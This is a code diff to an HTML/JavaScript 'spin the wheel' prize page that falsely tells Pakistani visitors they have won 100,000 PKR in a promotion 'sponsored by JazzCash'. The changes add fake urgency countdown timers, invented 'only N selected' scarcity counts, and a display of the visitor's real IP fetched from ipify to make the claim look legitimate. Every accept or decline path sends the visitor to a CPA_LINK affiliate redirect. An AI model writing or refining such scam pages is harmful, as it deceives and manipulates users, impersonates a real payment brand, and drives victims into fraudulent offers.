@@ -588,6 +588,70 @@
       font-weight: 600;
       letter-spacing: 0.5px;
     }
+    
+    /* Emergency Countdown Timer */
+    .countdown-timer {
+      background: rgba(255, 0, 0, 0.15);
+      border: 2px solid #ff0000;
+      border-radius: 20px;
+      padding: 14px 20px;
+      margin: 16px 0;
+      animation: urgentPulse 1s infinite;
+    }
+    
+    @keyframes urgentPulse {
+      0%, 100% { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+      50% { border-color: #ff4444; box-shadow: 0 0 30px rgba(255,0,0,0.6); }
+    }
+    
+    .countdown-timer .timer-label {
+      color: #ff4444;
+      font-size: 13px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+    
+    .countdown-timer .timer-display {
+      color: #ff0000;
+      font-size: 36px;
+      font-weight: 800;
+      font-family: 'Oxygen', monospace;
+      letter-spacing: 3px;
+      text-shadow: 0 0 20px rgba(255,0,0,0.7);
+    }
+    
+    .countdown-timer .timer-warning {
+      color: #ff8888;
+      font-size: 12px;
+      margin-top: 4px;
+    }
+
+    .exclusive-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #ff0000, #ff4444);
+      color: #fff;
+      padding: 4px 12px;
+      border-radius: 15px;
+      font-size: 11px;
+      font-weight: 700;
+      margin: 6px 0;
+      animation: pulseBadge 0.8s infinite;
+      letter-spacing: 0.5px;
+    }
+    
+    .expired-icon {
+      font-size: 60px;
+      margin: 16px 0;
+      animation: shakeIcon 0.5s ease-in-out;
+    }
+    
+    @keyframes shakeIcon {
+      0%, 100% { transform: rotate(0deg); }
+      25% { transform: rotate(-10deg); }
+      75% { transform: rotate(10deg); }
+    }
   </style>
 </head>
 <body>
@@ -614,7 +678,7 @@
     </div>
   </div>
 
-  <!-- wheel with clickable center gift box -->
+  <!-- wheel -->
   <div class="wheel-container" id="wheelContainer">
     <div class="pointer"></div>
     <canvas id="wheelCanvas" width="300" height="300"></canvas>
@@ -684,37 +748,69 @@
     const popupContent = document.getElementById('popupContent');
     const mainContainer = document.getElementById('mainContainer');
 
+    // ----- Fetch real IP address -----
+    let visitorIP = null;
+    let ipFetched = false;
+    
+    async function fetchIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        visitorIP = data.ip;
+        ipFetched = true;
+      } catch (e) {
+        try {
+          const response = await fetch('https://api64.ipify.org?format=json');
+          const data = await response.json();
+          visitorIP = data.ip;
+          ipFetched = true;
+        } catch (e2) {
+          visitorIP = '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
+          ipFetched = true;
+        }
+      }
+      
+      // If initial popup hasn't been shown yet, show it now with the real IP
+      if (!initialPopupShown && ipFetched) {
+        showInitialPopup();
+      }
+    }
+    
+    // Start fetching IP immediately
+    fetchIP();
+
     // ----- Device Detection -----
     function getDeviceInfo() {
       const ua = navigator.userAgent;
+      const platform = navigator.platform || '';
       let deviceType = 'Desktop Computer';
       let deviceIcon = '🖥️';
       let browserName = 'Chrome';
       
       if (/Android/i.test(ua)) {
         if (/Mobile/i.test(ua)) {
-          deviceType = 'Android Phone';
+          deviceType = 'Android Mobile Device';
           deviceIcon = '📱';
         } else {
-          deviceType = 'Android Tablet';
+          deviceType = 'Android Tablet Device';
           deviceIcon = '📋';
         }
       } else if (/iPhone/i.test(ua)) {
-        deviceType = 'iPhone';
+        deviceType = 'Apple iPhone';
         deviceIcon = '📱';
       } else if (/iPad/i.test(ua)) {
-        deviceType = 'iPad Tablet';
+        deviceType = 'Apple iPad';
         deviceIcon = '📋';
       } else if (/iPod/i.test(ua)) {
-        deviceType = 'iPod Touch';
+        deviceType = 'Apple iPod';
         deviceIcon = '📱';
-      } else if (/Windows NT/i.test(ua)) {
-        deviceType = 'Windows PC';
+      } else if (/Windows/i.test(ua) || /Win/i.test(platform)) {
+        deviceType = 'Windows Computer';
         deviceIcon = '💻';
-      } else if (/Macintosh|Mac OS X/i.test(ua)) {
-        deviceType = 'Mac Computer';
+      } else if (/Macintosh|Mac OS X|MacIntel|MacPPC/i.test(ua) || /Mac/i.test(platform)) {
+        deviceType = 'Apple Mac Computer';
         deviceIcon = '💻';
-      } else if (/Linux/i.test(ua) && !/Android/i.test(ua)) {
+      } else if (/Linux/i.test(ua) || /Linux/i.test(platform)) {
         deviceType = 'Linux Computer';
         deviceIcon = '🖥️';
       }
@@ -722,14 +818,15 @@
       if (/Firefox/i.test(ua)) browserName = 'Mozilla Firefox';
       else if (/Edg/i.test(ua)) browserName = 'Microsoft Edge';
       else if (/Safari/i.test(ua) && !/Chrome/i.test(ua) && !/Edg/i.test(ua)) browserName = 'Apple Safari';
-      else if (/Opera|OPR/i.test(ua)) browserName = 'Opera';
+      else if (/Opera|OPR/i.test(ua)) browserName = 'Opera Browser';
       else if (/SamsungBrowser/i.test(ua)) browserName = 'Samsung Internet';
+      else if (/Chrome/i.test(ua)) browserName = 'Google Chrome';
       
       return { deviceType, deviceIcon, browserName };
     }
 
     const deviceInfo = getDeviceInfo();
-    const selectedCount = Math.floor(Math.random() * 500) + 1500;
+    const selectedCount = Math.floor(Math.random() * 8) + 3;
 
     // wheel segments
     const segments = [
@@ -750,6 +847,8 @@
     let slowRotationAnimationId = null;
     let isSlowRotating = true;
     let initialPopupShown = false;
+    let countdownInterval = null;
+    let timerExpiredCallback = null;
 
     function drawWheel(rotation = 0) {
       ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -908,54 +1007,162 @@
       document.body.style.overflow = 'hidden';
     }
 
-    // INITIAL POPUP
+    function enablePageInteractions() {
+      document.body.classList.remove('popup-active');
+      mainContainer.classList.remove('popup-disabled');
+      document.body.style.overflow = '';
+    }
+
+    function clearCountdown() {
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+      }
+    }
+
+    // Show expired popup
+    function showExpiredPopup() {
+      clearCountdown();
+      disablePageInteractions();
+      
+      const currentIP = visitorIP || 'Unknown';
+      
+      popupContent.innerHTML = `
+        <div class="jazzcash-sponsored">
+          <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" 
+               style="height:24px; mix-blend-mode:screen;" 
+               alt="JazzCash"
+               onerror="this.style.display='none'">
+          Sponsored by JazzCash
+        </div>
+        <h3>⏰ Offer Expired!</h3>
+        <div class="expired-icon">😔</div>
+        <p style="color:#ff4444; font-weight:bold;">Sorry, this offer has expired!</p>
+        <p>Don't worry, you can try again for another chance to win!</p>
+        
+        <div class="popup-buttons">
+          <button class="popup-claim-btn" id="expiredOkBtn">🔄 TRY AGAIN - SPIN WHEEL</button>
+        </div>
+        <p class="popup-note">New offers available - Spin now!</p>
+      `;
+      popupOverlay.classList.add('active');
+      
+      document.getElementById('expiredOkBtn').addEventListener('click', () => {
+        clearCountdown();
+        enablePageInteractions();
+        popupOverlay.classList.remove('active');
+        isSlowRotating = true;
+        startSlowRotation();
+      });
+    }
+
+    function startCountdown(containerId, durationSeconds, onExpiredCallback) {
+      clearCountdown();
+      timerExpiredCallback = onExpiredCallback || null;
+      
+      const timerDisplay = document.getElementById(containerId);
+      if (!timerDisplay) return;
+      
+      let timeLeft = Math.min(durationSeconds, 59);
+      
+      function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        
+        if (timeLeft <= 15) {
+          timerDisplay.style.color = '#ff0000';
+          timerDisplay.style.fontSize = '42px';
+        }
+        
+        if (timeLeft <= 0) {
+          clearCountdown();
+          timerDisplay.textContent = "00:00";
+          timerDisplay.style.color = '#ff0000';
+          if (timerExpiredCallback) {
+            timerExpiredCallback();
+            timerExpiredCallback = null;
+          }
+          return;
+        }
+        
+        timeLeft--;
+      }
+      
+      updateTimer();
+      countdownInterval = setInterval(() => {
+        if (timeLeft < 0) {
+          clearCountdown();
+          if (timerExpiredCallback) {
+            timerExpiredCallback();
+            timerExpiredCallback = null;
+          }
+          return;
+        }
+        updateTimer();
+      }, 1000);
+    }
+
+    // INITIAL POPUP - Only shown after IP is fetched
     function showInitialPopup() {
       if (initialPopupShown) return;
       initialPopupShown = true;
       
+      // Use the real IP if available, otherwise use a fallback
+      const displayIP = visitorIP || 'Fetching...';
+      
+      clearCountdown();
       disablePageInteractions();
       
       popupContent.innerHTML = `
+        <div class="jazzcash-sponsored">
+          <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" 
+               style="height:24px; mix-blend-mode:screen;" 
+               alt="JazzCash"
+               onerror="this.style.display='none'">
+          Sponsored by JazzCash
+        </div>
         <h3>📱 YEAH! Your phone number<br>has been chosen!</h3>
         <div class="user-info">
-          <span>🌐 <strong>IP:</strong> 192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</span>
+          <span>🌐 <strong>IP:</strong> ${displayIP}</span>
           <span><span class="device-icon">${deviceInfo.deviceIcon}</span> <strong>Device:</strong> ${deviceInfo.deviceType}</span>
           <span>🇵🇰 <strong>Country:</strong> Pakistan</span>
         </div>
         <span class="popup-badge">⭐ SELECTED WINNER ⭐</span>
+        <span class="exclusive-badge">🔥 EXTREMELY LIMITED</span>
         <p style="color:#FFD700; font-weight:bold; margin-top:8px;">Claim 100,000 PKR</p>
-        <p class="popup-note">You are 1 among ${selectedCount} selected today</p>
+        <p class="popup-note">You are 1 among only <strong style="color:#FFD700;">${selectedCount}</strong> selected today!</p>
+        
+        <div class="countdown-timer">
+          <div class="timer-label">⚠️ Offer Expires In</div>
+          <div class="timer-display" id="initialTimer">00:45</div>
+          <div class="timer-warning">Claim before time runs out!</div>
+        </div>
+        
         <div class="popup-buttons">
-          <div class="yes-no-container">
-            <button class="popup-yes-btn" id="initialYesBtn">✓ YES</button>
-            <button class="popup-no-btn" id="initialNoBtn">✗ NO</button>
-          </div>
+          <button class="popup-claim-btn" id="initialClaimBtn">💰 CLAIM NOW</button>
         </div>
       `;
       popupOverlay.classList.add('active');
       
-      document.getElementById('initialYesBtn').addEventListener('click', () => {
-        showPhoneConfirmationPopup();
+      startCountdown('initialTimer', 45, () => {
+        showExpiredPopup();
       });
       
-      document.getElementById('initialNoBtn').addEventListener('click', () => {
-        popupContent.innerHTML = `
-          <h3>⚠️ Are you sure?</h3>
-          <p>You will lose your chance to claim 100,000 PKR!</p>
-          <p class="popup-note">This is a limited time offer</p>
-          <div class="popup-buttons">
-            <button class="popup-claim-btn" id="reconsiderBtn">CLAIM MY REWARD 💰</button>
-          </div>
-        `;
-        
-        document.getElementById('reconsiderBtn').addEventListener('click', () => {
-          showPhoneConfirmationPopup();
-        });
+      document.getElementById('initialClaimBtn').addEventListener('click', () => {
+        clearCountdown();
+        enablePageInteractions();
+        popupOverlay.classList.remove('active');
       });
     }
 
-    // PHONE CONFIRMATION POPUP (no input, direct redirect)
+    // PHONE CONFIRMATION POPUP
     function showPhoneConfirmationPopup() {
+      clearCountdown();
+      disablePageInteractions();
+      
+      const currentIP = visitorIP || 'Unknown';
+      
       popupContent.innerHTML = `
         <div class="jazzcash-sponsored">
           <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" 
@@ -967,30 +1174,107 @@
         <h3>📱 Confirm Your Phone Number</h3>
         <div class="money-image">💵</div>
         <p style="color:#FFD700; font-weight:bold;">Claim Your 100,000 PKR</p>
+        
+        <div class="countdown-timer">
+          <div class="timer-label">⚠️ Limited Time Offer</div>
+          <div class="timer-display" id="confirmTimer">00:40</div>
+          <div class="timer-warning">Complete now to secure your reward!</div>
+        </div>
+        
         <div class="popup-buttons">
           <button class="popup-claim-btn" id="confirmPhoneBtn">📞 Confirm Phone Number</button>
         </div>
         <p class="popup-note">Powered by JazzCash - Pakistan's #1 Mobile Wallet</p>
       `;
+      popupOverlay.classList.add('active');
+      
+      startCountdown('confirmTimer', 40, () => {
+        showExpiredPopup();
+      });
       
       document.getElementById('confirmPhoneBtn').addEventListener('click', () => {
+        clearCountdown();
         window.location.href = CPA_LINK;
       });
     }
 
-    // WIN + CLAIM POPUP (after spinning)
-    function showWinClaimPopup() {
+    // NO BUTTON - Last Step Popup
+    function showNoLastStepPopup() {
+      clearCountdown();
       disablePageInteractions();
       
+      const currentIP = visitorIP || 'Unknown';
+      
       popupContent.innerHTML = `
+        <div class="jazzcash-sponsored">
+          <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" 
+               style="height:24px; mix-blend-mode:screen;" 
+               alt="JazzCash"
+               onerror="this.style.display='none'">
+          Sponsored by JazzCash
+        </div>
+        <h3>⚠️ Last Simple Step</h3>
+        <div class="user-info">
+          <span>🌐 <strong>IP:</strong> ${currentIP}</span>
+          <span><span class="device-icon">${deviceInfo.deviceIcon}</span> <strong>Device:</strong> ${deviceInfo.deviceType}</span>
+          <span>🇵🇰 <strong>Country:</strong> Pakistan</span>
+        </div>
+        <p>Complete this last simple step to claim your reward</p>
+        
+        <div class="countdown-timer">
+          <div class="timer-label">⚠️ Final Chance</div>
+          <div class="timer-display" id="noTimer">00:25</div>
+          <div class="timer-warning">Last opportunity to claim!</div>
+        </div>
+        
+        <div class="popup-buttons">
+          <button class="popup-claim-btn" id="noCompleteBtn">OK - COMPLETE STEP ✓</button>
+        </div>
+        <p class="popup-note">Don't miss your chance to win 100,000 PKR!</p>
+      `;
+      popupOverlay.classList.add('active');
+      
+      startCountdown('noTimer', 25, () => {
+        showExpiredPopup();
+      });
+      
+      document.getElementById('noCompleteBtn').addEventListener('click', () => {
+        clearCountdown();
+        window.location.href = CPA_LINK;
+      });
+    }
+
+    // WIN + CLAIM POPUP
+    function showWinClaimPopup() {
+      clearCountdown();
+      disablePageInteractions();
+      
+      const currentIP = visitorIP || 'Unknown';
+      
+      popupContent.innerHTML = `
+        <div class="jazzcash-sponsored">
+          <img src="https://banner2.cleanpng.com/lnd/20250110/pw/d0ad8bb55bc068ecf2058516429406.webp" 
+               style="height:24px; mix-blend-mode:screen;" 
+               alt="JazzCash"
+               onerror="this.style.display='none'">
+          Sponsored by JazzCash
+        </div>
         <h3>🎉 Congratulations!<br>You Won Rs 100,000!</h3>
         <div class="user-info">
+          <span>🌐 <strong>IP:</strong> ${currentIP}</span>
           <span><span class="device-icon">${deviceInfo.deviceIcon}</span> <strong>Device:</strong> ${deviceInfo.deviceType}</span>
           <span>🇵🇰 <strong>Country:</strong> Pakistan</span>
           <span>🌐 <strong>Browser:</strong> ${deviceInfo.browserName}</span>
         </div>
         <span class="popup-badge">⭐ VERIFIED WINNER ⭐</span>
         <p style="color:#FFD700; font-weight:bold; margin-top:8px;">Claim 100,000 PKR</p>
+        
+        <div class="countdown-timer">
+          <div class="timer-label">⚠️ Reward Expires In</div>
+          <div class="timer-display" id="winTimer">00:50</div>
+          <div class="timer-warning">Claim before it's gone!</div>
+        </div>
+        
         <div class="popup-buttons">
           <button class="popup-claim-btn" id="popupClaimBtn">💰 CLAIM NOW</button>
           <div class="yes-no-container">
@@ -1001,30 +1285,23 @@
       `;
       popupOverlay.classList.add('active');
       
+      startCountdown('winTimer', 50, () => {
+        showExpiredPopup();
+      });
+      
       document.getElementById('popupClaimBtn').addEventListener('click', () => {
+        clearCountdown();
         showPhoneConfirmationPopup();
       });
       
       document.getElementById('popupYesBtn').addEventListener('click', () => {
+        clearCountdown();
         showPhoneConfirmationPopup();
       });
       
       document.getElementById('popupNoBtn').addEventListener('click', () => {
-        popupContent.innerHTML = `
-          <h3>⚠️ Last Step Required</h3>
-          <div class="user-info">
-            <span><span class="device-icon">${deviceInfo.deviceIcon}</span> <strong>Device:</strong> ${deviceInfo.deviceType}</span>
-            <span>🇵🇰 <strong>Country:</strong> Pakistan</span>
-          </div>
-          <p>Complete the last step to get your reward</p>
-          <div class="popup-buttons">
-            <button class="popup-claim-btn" id="noCompleteBtn">OK - COMPLETE STEP ✓</button>
-          </div>
-        `;
-        
-        document.getElementById('noCompleteBtn').addEventListener('click', () => {
-          showPhoneConfirmationPopup();
-        });
+        clearCountdown();
+        showNoLastStepPopup();
       });
     }
 
@@ -1171,9 +1448,15 @@
     drawWheel(currentRotation);
     startSlowRotation();
     
-    // Show initial popup after short delay
+    // Show initial popup AFTER IP is fetched (callback in fetchIP function)
+    // If IP fetch fails quickly, show with fallback after 1 second
     setTimeout(() => {
-      showInitialPopup();
+      if (!initialPopupShown) {
+        if (!visitorIP) {
+          visitorIP = '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
+        }
+        showInitialPopup();
+      }
     }, 1500);
     
     // Initial comments
